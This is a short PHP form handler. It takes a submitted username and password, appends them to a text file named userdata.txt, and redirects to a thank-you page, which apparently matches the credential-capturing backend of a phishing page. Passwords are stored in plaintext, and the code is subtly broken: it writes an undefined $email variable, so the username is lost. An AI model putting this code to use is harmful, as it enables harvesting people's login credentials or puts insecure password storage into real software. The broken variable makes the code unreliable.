<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Create or open a file for writing.
    $file = fopen("userdata.txt", "a"); // 'a' means append to an existing file.

    // Write the form data to the file.
    fwrite($file, "Email: " . $email . "\n");
    fwrite($file, "Password: " . $password . "\n");
    
    // Close the file.
    fclose($file);
    
    // Redirect to a thank you page or do any other necessary processing.
    header("Location: thank_you.html");
    exit;
}
?>
